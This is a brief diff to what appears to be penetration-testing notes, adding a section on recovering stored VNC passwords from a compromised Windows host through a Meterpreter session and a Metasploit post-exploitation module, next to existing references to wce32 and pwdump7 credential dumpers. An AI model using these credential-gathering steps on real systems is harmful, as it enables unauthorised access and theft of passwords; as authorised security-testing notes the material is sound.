@@ -78,3 +78,13 @@ wce32.exe -w
 
 http://www.tarasco.org/security/pwdump_7/
 
+## VNC
+
+VNC require a specific password to log in to. So it is not the same password as the user password. If you have a meterpreter shell you can run the post exploit module to get the VNC password.
+
+```
+background
+use post/windows/gather/credentials/vnc
+set session X
+exploit
+```
